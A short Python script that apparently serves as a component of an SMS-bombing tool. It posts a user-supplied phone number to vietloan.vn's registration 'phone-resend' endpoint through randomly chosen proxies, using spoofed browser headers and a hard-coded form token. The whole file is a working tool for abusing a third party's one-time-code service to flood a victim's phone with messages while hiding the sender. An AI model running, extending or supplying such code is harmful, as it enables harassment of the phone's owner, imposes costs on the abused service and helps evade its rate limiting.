import requests
import random
from termcolor import colored

# Load proxies from live.txt
def load_proxies(file_path="live.txt"):
    try:
        with open(file_path, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        print(colored("Proxy file not found! Please make sure live.txt exists.", "red"))
        return []

# Function to send a request with proxy
def send_request_with_proxy(url, data, headers, proxy):
    try:
        proxy_dict = {
            "http": proxy,
            "https": proxy,
        }
        response = requests.post(url, data=data, headers=headers, proxies=proxy_dict, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        return None

# Vietloan function with proxy support
def vietloan(phone):
    url = "https://vietloan.vn/register/phone-resend"
    headers = {
        "accept": "*/*",
        "accept-language": "vi,vi-VN;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://vietloan.vn",
        "referer": "https://vietloan.vn/register",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    }
    data = {
        "phone": phone,
        "_token": "0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU",
    }

    proxies = load_proxies()
    if not proxies:
        print(colored("No proxies available. Exiting.", "red"))
        return

    proxy = random.choice(proxies)
    response = send_request_with_proxy(url, data, headers, proxy)

    if response and response.status_code == 200:
        print(colored(f"[SUCCESS] Sent request to {phone} using proxy {proxy}", "green"))
    else:
        print(colored(f"[FAILED] Could not send request to {phone} using proxy {proxy}", "red"))

# Main function for testing
def main():
    phone_number = input("Enter phone number: ")
    vietloan(phone_number)

if __name__ == "__main__":
    main()
